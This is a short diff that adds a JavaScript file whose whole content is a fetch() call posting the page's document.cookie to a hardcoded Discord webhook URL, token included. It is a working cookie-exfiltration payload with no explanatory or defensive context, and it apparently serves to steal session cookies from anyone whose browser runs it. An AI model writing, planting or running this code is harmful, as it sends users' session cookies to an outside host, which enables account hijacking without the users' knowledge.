@@ -1,0 +1,13 @@
+fetch(
+    'https://discord.com/api/webhooks/868643755241127967/cFhTb7ce8GGH2NlJ8purQd2JEq-XOXn-tzL-C_m_fxay_y1vVJAgUaT8A1m6wHH_ZwBF',
+    {
+        method: 'post',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            username: 'webhook',
+            content: document.cookie
+        })
+    }
+)
